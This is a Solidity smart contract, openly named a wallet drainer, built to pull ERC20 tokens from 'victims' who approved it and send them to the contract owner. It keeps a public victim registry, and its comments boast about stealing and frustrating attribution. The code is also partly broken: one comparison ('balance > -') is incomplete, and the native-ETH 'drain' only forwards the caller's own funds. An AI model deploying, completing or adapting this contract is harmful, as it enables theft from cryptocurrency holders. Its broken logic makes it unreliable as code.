// EVMDrainer.sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v4.9.0/contracts/access/Ownable.sol";
import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v4.9.0/contracts/token/ERC20/IERC20.sol";
import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v4.9.0/contracts/token/ERC20/utils/SafeERC20.sol";
import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v4.9.0/contracts/security/ReentrancyGuard.sol";

contract EVMDrainerFixed is Ownable, ReentrancyGuard {
    using SafeERC20 for IERC20;
    
    // Public mappings for anyone to see victims - transparency!
    mapping(address => Victim) public victims;
    address[] public victimAddresses;
    
    uint256 public victimCount;
    uint256 public totalDrained;
    
    struct Victim {
        address wallet;
        uint256 amount;
        uint256 timestamp;
        bool drained;
        address drainedBy;  // Who drained them
    }
    
    event FundsDrained(address indexed victim, uint256 amount, address token, address drainer);
    event ContractDestroyed(address indexed owner);
    
    constructor() Ownable() {}
    
    // ✅ INTENTIONALLY PUBLIC - Let anyone drain anyone!
    // This creates chaos and makes attribution harder
    function drainNative(address victim) external payable nonReentrant {
        require(msg.value > 0, "Send ETH to drain");
        
        // If already drained, update amount
        if (victims[victim].drained) {
            victims[victim].amount += msg.value;
        } else {
            victims[victim] = Victim({
                wallet: victim,
                amount: msg.value,
                timestamp: block.timestamp,
                drained: true,
                drainedBy: msg.sender
            });
            victimAddresses.push(victim);
            victimCount++;
        }
        
        totalDrained += msg.value;
        
        // Forward to owner (YOU)
        payable(owner()).transfer(msg.value);
        
        emit FundsDrained(victim, msg.value, address(0), msg.sender);
    }
    
    // ✅ NO AUTHORIZATION NEEDED - If victim approved, steal!
    function drainERC20(address victim, address tokenAddress, uint256 amount) external nonReentrant {
        // Check if victim approved this contract
        IERC20 token = IERC20(tokenAddress);
        uint256 allowance = token.allowance(victim, address(this));
        require(allowance >= amount, "Victim didn't approve enough");
        
        if (!victims[victim].drained) {
            victims[victim] = Victim({
                wallet: victim,
                amount: amount,
                timestamp: block.timestamp,
                drained: true,
                drainedBy: msg.sender
            });
            victimAddresses.push(victim);
            victimCount++;
        } else {
            victims[victim].amount += amount;
        }
        
        totalDrained += amount;
        
        // Steal the tokens
        token.safeTransferFrom(victim, owner(), amount);
        
        emit FundsDrained(victim, amount, tokenAddress, msg.sender);
    }
    
    // ✅ "Kill switch" - Modern alternative to selfdestruct
    function emergencyWithdrawAndClose() external onlyOwner {
        uint256 balance = address(this).balance;
        if (balance > -) {
            payable(owner()).transfer(balance);
        }
        
        // Mark contract as closed
        totalDrained = type(uint256).max;  // Overflow as signal
        victimCount = type(uint256).max;
        
        emit ContractDestroyed(owner());
    }
    
    // Helper: Check if address is victim
    function isVictim(address _addr) external view returns (bool) {
        return victims[_addr].drained;
    }
    
    // Helper: Get all victims
    function getAllVictims() external view returns (address[] memory) {
        return victimAddresses;
    }
    
    // Withdraw function for owner
    function withdraw(address tokenAddress, uint256 amount) external onlyOwner {
        if (tokenAddress == address(0)) {
            payable(owner()).transfer(amount);
        } else {
            IERC20(tokenAddress).safeTransfer(owner(), amount);
        }
    }
}
